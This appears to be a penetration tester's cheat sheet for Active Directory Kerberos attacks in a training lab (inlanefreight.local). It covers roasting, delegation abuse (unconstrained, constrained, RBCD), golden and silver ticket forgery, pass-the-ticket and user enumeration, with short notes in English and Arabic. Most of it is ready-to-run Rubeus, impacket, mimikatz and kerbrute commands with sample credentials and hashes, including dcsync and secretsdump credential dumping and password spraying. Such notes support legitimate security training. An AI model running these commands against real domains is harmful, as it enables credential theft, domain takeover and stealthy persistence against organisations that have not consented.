
---

> AS-RepRoasting

```powershell
# From Windows
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt

# From Linux
impacket-GetNPUsers inlanefreight.local/pixis -request
impacket-GetNPUsers INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile users.txt -no-pass

# Cracking
hashcat.exe -m 18200 hashes.txt rockyou.txt
```

> Kerberoasting

```bash
# From Windows
Rubeus.exe kerberoast /nowrap

# From Linux
impacket-GetUserSPNs inlanefreight.local/pixis -request

# Cracking
hashcat.exe -m 13100 kerb.txt rockyou.txt
```

---

> Unconstrained Delegation

```c
## ✅ Unconstrained Delegation

### 🟠 Server (Computer Account)
- If the server you hacked has **Unconstrained Delegation**:
  - Any user who connects to it → you can steal their TGT from memory.
  - There are also attacks like **Printer Bug** that let you *force* any user (even a Domain Controller) to connect → and steal their ticket.

---

### 🟠 User Account
- You need a user account with **Unconstrained Delegation**.
- You also need permission to edit it so you can add a new SPN.
- Choose a **service** that has lots of legitimate traffic and *impersonate* its name.
- Register that service name in DNS so it resolves to your IP.
- Then:
  - Either victims will naturally connect to your fake service.
  - Or you force them to connect.
- Finally, you can grab their ticket (TGT) from those connections.
```

```powershell
# Machine
.\Rubeus.exe monitor /interval:5 /nowrap
.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local # Printer bug
.\Rubeus.exe asktgt /rc4:hash /user:sarah.lafferty /ptt

# User
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207
nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local
python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local dc01.inlanefreight.local
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local
export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
secretsdump.py -k -no-pass dc01.inlanefreight.local
```

> Constrained Delegation

⭐ **بدون Transition:** لازم اليوزر يتصل عليك بنفسه.  
⭐ **مع Transition:** أنت بتختار أي يوزر بدك إياه.

✅ **الخطوات بأبسط شكل:**  
1️⃣ معك حساب عليه Constrained Delegation + Protocol Transition.  
2️⃣ بتسوي Logon عليه عشان تاخذ TGT.  
3️⃣ بتطلب تذكرة باسم أي يوزر بدك (مثلا Administrator).  
4️⃣ بتحولها لتذكرة صالحة للخدمة المسموحة على السيرفر.  
5️⃣ بتستخدم التذكرة تدخل على السيرفر كـ Administrator.

```c
## ✅ Constrained Delegation

### 🟠 Without Protocol Transition
- The account has **Constrained Delegation** but *no* Protocol Transition.
- It can only impersonate users who actually **connect to it first**.
- Victim must authenticate → only then can you reuse their ticket to access specific allowed services (SPNs).
- You can’t just pick any user—you have to wait for them to log in.

---

### 🟠 With Protocol Transition
- The account has **Constrained Delegation** *with* Protocol Transition.
- This lets you **choose any user you want** to impersonate—even if they never connected.
- Steps:
  1️⃣ Log in as the delegated account to get a TGT.  
  2️⃣ Use **S4U2Self** → request a ticket for *any* user you want.  
  3️⃣ Use **S4U2Proxy** → turn that into a ticket that’s valid for the *specific* allowed service (SPN).  
  4️⃣ Use this final ticket to access that service as the impersonated user.

```

```powershell
# Windows
Get-DomainComputer -TrustedToAuth
.\mimikatz.exe privilege::debug sekurlsa::msv exit
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
Enter-PSSession ws01.inlanefreight.local

# Linux
impacket-findDelegation INLANEFREIGHT.LOCAL/carole.rose:jasmine
impacket-getST -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass INLANEFREIGHT.LOCAL/administrator@DC01 -debug
```

> RBCD

```c
## ✅ Resource-Based Constrained Delegation (RBCD)

### 🟠 How It Works
- Introduced in **Windows Server 2012**.
- Instead of setting delegation rights on the *source* account → the **target server itself** decides who can delegate *to* it.
- Controlled by the attribute:
  `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- The target server has a security descriptor listing which accounts can impersonate users *to* it.

---

### 🟠 The Attack
- If you have **write access** to a computer account (e.g., GenericWrite or GenericAll):
  - You can modify its `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Steps:
  1️⃣ Create or control a computer account (you need one with an SPN).  
  2️⃣ Add your controlled computer to the target server’s **AllowedToAct** list.  
  3️⃣ Now your computer account can **impersonate any user** *to that target server*.  
  4️⃣ Use **S4U2Self** and **S4U2Proxy** to request a ticket for any user (like Administrator) to the target server’s service (like CIFS or WinRM).  
  5️⃣ Use the ticket to access the server as that user.
```

```powershell
# import the PowerView module
Import-Module C:\Tools\PowerView.ps1

# get all computers in the domain
$computers = Get-DomainComputer

# get all users in the domain
$users = Get-DomainUser

# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights on the computer object
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```

```powershell
# Windows
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKTHEBOX -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer HACKTHEBOX -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
.\Rubeus.exe hash /password:Hackthebox123+! /user:HACKTHEBOX$ /domain:inlanefreight.local
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt

# Linux
impacket-addcomputer -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes
https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
impacket-getST -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass dc01.inlanefreight.local
```

---

> Golden Ticket

```c
## ✅ Golden Ticket

### 🟠 How It Works
- A **Golden Ticket** is a forged **Kerberos Ticket Granting Ticket (TGT)**.
- It’s valid for *any* user in the domain—even Domain Admin.
- It’s signed with the **krbtgt account hash** → so the Domain Controller trusts it.

---

### 🟠 The Attack
- To forge a Golden Ticket, you need:
	1. `Domain Name`
	2. `Domain SID`
	3. `Username to Impersonate`
	4. `KRBTGT's hash`
- Steps:
  1️⃣ Compromise a Domain Controller or dump **krbtgt** hash with tools like Mimikatz.  
  2️⃣ Use the hash to **create a forged TGT** for any user you want.  
  3️⃣ Inject that TGT into your session.  
  4️⃣ Use it to request any service ticket → gives you **unlimited access** across the domain.  
- The ticket can have **any lifetime** you want → it’s extremely hard to detect.

---

### 🟠 Why It’s So Dangerous
- Lets an attacker:
  - Be any user, including Domain Admin.  
  - Access any service in the domain.  
  - Persist indefinitely (even if passwords are changed) unless **krbtgt** password is reset.  

```

```powershell
# Windows
Get-DomainSID
.\mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:inlanefreight.local" exit
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
Enter-PSSession dc01

# Linux
impacket-lookupsid inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
impacket-ticketer -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass dc01.inlanefreight.local
```

> Silver Ticket

```c
## ✅ Silver Ticket

### 🟠 How It Works
- A **Silver Ticket** is a **forged Service Ticket (TGS)** for a *specific service* on a *specific server*.
- Instead of forging a TGT (like a Golden Ticket), you forge **only** the ticket for one service.
- It’s signed using the **service account’s hash** (not the krbtgt hash).

---

### 🟠 The Attack
- To forge a Silver Ticket, you need:
  - The **service account hash** (for MSSQL, CIFS, HTTP SPN, etc.).  
  - The **domain SID**.  
- Steps:
  1️⃣ Dump the hash of the target service account (e.g. with Kerberoasting).  
  2️⃣ Forge a Service Ticket (TGS) for that SPN using the hash.  
  3️⃣ Specify **any domain user you want to impersonate** in the ticket (even Administrator).  
  4️⃣ Inject it into your session.  
  5️⃣ Use it to authenticate to **that specific service on that server** as the impersonated user.

---

### 🟠 Why It’s Useful
- You can **impersonate any user** (like Domain Admin) *on that service only*.  
- No need to contact the Domain Controller after forging → **stealthy**.  
- Harder to detect:
  - DC doesn’t log new Kerberos requests.  
  - Only local service sees the ticket validation.  
- Excellent for **persistence** or **lateral movement** to specific servers without alerting central monitoring.

```

```powershell
# Windows
Get-DomainSID
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ptt
dir //sql01.inlanefreight.local/c$

# Linux
impacket-lookupsid inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
impacket-ticketer -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
impacket-smbclient -k -no-pass sql01.inlanefreight.local
impacket-psexec -k -no-pass sql01.inlanefreight.local
```

> Pass The Ticket

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
.\Rubeus.exe triage
klist # should be empty
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
dir \\dc01\\c$
```

---

> User Enumeration

```powershell
kerbrute userenum users.txt --dc dc01.inlanefreight.local -d inlanefreight.local
kerbrute passwordspray users.txt inlanefreight2020 --dc dc01.inlanefreight.local -d inlanefreight.local
```

